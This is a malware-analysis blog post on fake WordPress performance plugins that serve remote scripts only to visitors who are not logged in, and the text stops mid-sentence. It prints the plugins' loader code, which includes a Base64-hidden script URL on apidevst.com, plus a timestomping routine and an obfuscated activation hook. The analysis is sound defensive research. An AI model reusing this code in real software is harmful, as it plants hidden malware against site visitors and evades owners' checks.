---
title: Fake "Optimizer" Plugins That Only Misbehave for Visitors
url: https://lukeleal.com/research/posts/fake-optimizer-plugins-visitors-only/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:27.145549
---

# Fake "Optimizer" Plugins That Only Misbehave for Visitors

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Fake “Optimizer” Plugins That Only Misbehave for Visitors](https://lukeleal.com/research/posts/fake-optimizer-plugins-visitors-only/)

2026-06-03Luke

#[Fusion Optimizer Pro](https://lukeleal.com/research/tags/fusion-optimizer-pro/)
#[Xtra Media Tools](https://lukeleal.com/research/tags/xtra-media-tools/)
#[apidevst.com](https://lukeleal.com/research/tags/apidevst.com/)
#[skillboxultra.live](https://lukeleal.com/research/tags/skillboxultra.live/)
#[malvertising](https://lukeleal.com/research/tags/malvertising/)
#[timestomping](https://lukeleal.com/research/tags/timestomping/)
#[fake plugin](https://lukeleal.com/research/tags/fake-plugin/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Fake "Optimizer" Plugins That Only Misbehave for Visitors](https://lukeleal.com/research/fake-optimizers-cover-q90.jpg "Cover Image")

## Table of Contents

* [Fusion Optimizer Pro](#fusion-optimizer-pro)
  + [The loader](#the-loader)
  + [Cache flushing](#cache-flushing)
  + [Timestamp forging](#timestamp-forging)
* [The Word-Salad Plugin](#the-word-salad-plugin)
  + [The hidden login](#the-hidden-login)
  + [What’s missing](#whats-missing)
* [Xtra Media Tools](#xtra-media-tools)
  + [Silent unless you’re a visitor](#silent-unless-youre-a-visitor)
  + [The payload](#the-payload)
* [The Domains Today](#the-domains-today)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

The hardest malware to find on a website is the kind that **doesn’t run when you look for it**. If you’re logged in as an administrator, a plugin that checks `is_user_logged_in()` first can behave perfectly, and the site owner never sees the problem that visitors are reporting.

This post covers three fake plugins that do exactly that. They’re dressed up as performance and media tools, and they have different payloads and different extras, but one design.

| Plugin | Collected | Payload | Stays quiet for | Extras |
| --- | --- | --- | --- | --- |
| **Fusion Optimizer Pro** 1.7.3 | June 2024 | `<script src>` from `apidevst.com`, in the page header | logged-in admins, login and register pages, admin screens | flushes caches, **backdates its own files by 371 days** |
| **A “word-salad” plugin** (no name in my copy) | March 2025 | not in my copy | n/a | **hidden login-as-anyone URL**, flag file, self-hiding |
| **Xtra Media Tools** 1.0.0 | March 2025 | `fetch()` + `eval()` from `skillboxultra.live` | any logged-in user, static files, admin, feeds | decoy class check |

## Fusion Optimizer Pro[#](#fusion-optimizer-pro)

The header promises *“a powerful WordPress plugin that boosts your site’s performance by enhancing page load speeds.”* Both the plugin and author URLs are `icwp.io/fusionoptimizerproauthor`. I checked that: `icwp.io` redirects **any** path, including this invented one, to what looks like a security-plugin vendor’s link tracker. It was probably picked because a real-looking URL that never 404s helps a plugin pass a quick glance.

### The loader[#](#the-loader)

```
function fop_enqueue_conditional_scripts() {
    if (strpos($_SERVER['REQUEST_URI'], 'wp-login.php') !== false || strpos($_SERVER['REQUEST_URI'], 'wp-register.php') !== false || is_admin()) {
        return;
    }
    if (current_user_can('administrator')) {
        return;
    }
    $encoded_url = 'aHR0cHM6Ly9hcGlkZXZzdC5jb20vdWFXZmhDWkhPSVJxZ20zc1FBOFIyaFNsb2FheXRMZ2pxZXZxLUdrQ1p2b0YK';
    wp_register_script('fop_custom_script', base64_decode($encoded_url), array(), null, false);
    wp_enqueue_script('fop_custom_script');
}
```

The script is skipped on the login and registration pages, in the admin, and for administrators. Everyone else gets `https://apidevst.com/uaWfhCZHOIRqgm3sQA8R2hSloaaytLgjqevq-GkCZvoF` added to the **page header** (`in_footer` is `false`) as a normal registered script, so it looks like any other plugin’s JavaScript in the page source.

There’s a tell in the Base64. It ends in `K`, and decoding it gives a URL with a **trailing newline**, which is typically what you get from running `echo` instead of `echo -n` when encoding it. The script version argument is `null`, so unlike most registered scripts it has no `?ver=` on the end.

### Cache flushing[#](#cache-flushing)

On activation the plugin calls `fop_clear_caches()`, which flushes the object cache and then purges W3 Total Cache, WP Super Cache, WP Fastest Cache and WP Rocket. This looks like a legitimate feature. It also has a practical purpose: cached copies of the site’s pages were generated *before* the plugin existed, so purging them makes the new script show up on every page immediately.

### Timestamp forging[#](#timestamp-forging)

The second activation hook has a deliberately boring name, `fop_clear_caches_date`:

```
function fop_recursive_date_change($path) {
    $days_to_subtract = 371;
    if (is_dir($path)) {
        $new_time = strtotime("-$days_to_subtract days");
        touch($path, $new_time);
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $fileinfo) {
            touch($fileinfo->getRealPath(), $new_time);
        }
    }
    ...
}
```

When an administrator activates the plugin, every file and folder inside it has its modification time set to **371 days ago**. A plugin installed yesterday looks like it has been on the site for over a year, so sorting by “recently modified” or checking for changes in the last few weeks won’t show it. As with the [`query.php` watchdog](https://lukeleal.com/research/posts/query-php-reinfection-watchdog/), the lesson is that **file times can be written by whoever has write access, so they can’t prove anything**.

The forgery is crude, though. `$new_time` is calculated once, so **every file and the plugin’s folder get exactly the same timestamp, to the second**. Real plugins have files with a spread of times.

## The Word-Salad Plugin[#](#the-word-salad-plugin)

The second sample has no plugin header, and its function names are random dictionary words: `selfishly_depot_impeccable_queasy`, `serialize_covenant_premise_joshingly`, `hover_urgently_integer`, `swift_implode_everlasting`. If every build uses different words, a signature based on function names is useless. It’s Fusion’s `fop_` prefix idea taken to the extreme.

The structure suggests it comes from the same codebase as Fusion. Compare this function (which I assume is the activation hook; the registration line isn’t in my copy) with Fusion’s `fop_clear_caches()`:

```
function serialize_covenant_premise_joshingly()
{
    $p = __DIR__ . "/" . "license.txt";
    file_put_contents($p, "e2075474294983e013ee4dd2201c7a73=1");
    if (wp_using_ext_object_cache()) {
        wp_cache_flush();
    }
    yuppify_filthy_chasuble();
}
```

It has the same `wp_using_ext_object_cache()` check, the same `wp_cache_flush()`, and then a call to a purge function. The word-salad version just renames everything. It also adds a **flag file**: a ...